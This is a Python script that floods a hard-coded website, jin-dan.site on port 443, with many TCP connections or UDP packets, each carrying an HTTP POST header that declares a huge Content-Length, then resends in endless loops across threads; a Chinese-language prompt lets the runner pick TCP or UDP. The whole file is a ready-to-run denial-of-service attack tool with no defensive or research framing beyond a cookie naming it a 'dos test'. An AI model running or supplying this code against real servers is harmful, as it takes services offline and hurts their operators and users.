import socket
import time
import threading

MAX_CONNECT = 200
PORT = 443
HOST = "jin-dan.site"
PAGE = "/"
buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Content-Length: 10000000000\r\n"
       "Cookie: dklkt_dos_test\r\n"
       "\r\n" % (PAGE, HOST))
buf = buf.encode()
socks = []


def conn_thread_tcp(MAX_CONN=MAX_CONNECT):
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf)
            print("[+] Send buf OK!,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("[-] Could not connect to server or send error:%s" % ex)
            time.sleep(0)


def send_thread_tcp():
    global socks
    while True:
        for s in socks:
            try:
                s.send(buf)
                # print("[+] send OK! %s" % s)
            except Exception as ex:
                print("[-] send Exception:%s\n" % ex)
                # socks.remove(s)
                # s.close()
        time.sleep(0)
        # sys.exit(0)


def run_tcp(host=HOST, times=MAX_CONNECT, page=PAGE, port=PORT):
    global buf, MAX_CONNECT, PORT, HOST, PAGE
    MAX_CONNECT = times
    PORT = port
    HOST = host
    PAGE = page
    buf = ("POST %s HTTP/1.1\r\n"
           "Host: %s\r\n"
           "Content-Length: 1000000000\r\n"
           "Cookie: dklkt_dos_test\r\n"
           "\r\n" % (PAGE, HOST))
    buf = buf.encode()
    conn_th = threading.Thread(target=conn_thread_tcp, args=())
    send_th = threading.Thread(target=send_thread_tcp, args=())
    conn_th.start()
    send_th.start()


def conn_thread_udp(MAX_CONN=MAX_CONNECT):
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.sendto(buf, (HOST, PORT))
            # print("[+] Send buf OK!,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("[-] Could not connect to server or send error:%s" % ex)
            time.sleep(0)


def send_thread_udp():
    global socks
    while True:
        for s in socks:
            try:
                s.sendto(buf, (HOST, PORT))
                # print("[+] send OK! %s" % s)
            except Exception as ex:
                print("[-] send Exception:%s\n" % ex)
                # socks.remove(s)
                # s.close()
        time.sleep(0)


def run_udp(host=HOST, times=MAX_CONNECT, page=PAGE, port=PORT):
    global buf, MAX_CONNECT, PORT, HOST, PAGE
    MAX_CONNECT = times
    PORT = port
    HOST = host
    PAGE = page
    buf = ("POST %s HTTP/1.1\r\n"
           "Host: %s\r\n"
           "Content-Length: 1000000000\r\n"
           "Cookie: dklkt_dos_test\r\n"
           "\r\n" % (PAGE, HOST))
    buf = buf.encode()
    conn_th = threading.Thread(target=conn_thread_udp, args=())
    send_th = threading.Thread(target=send_thread_udp, args=())
    conn_th.start()
    send_th.start()


if __name__ == "__main__":
    输入 = input("请输入tcp或udp：")
    if(输入.lower() == "tcp"):
        run_tcp()
    else:
        run_udp()
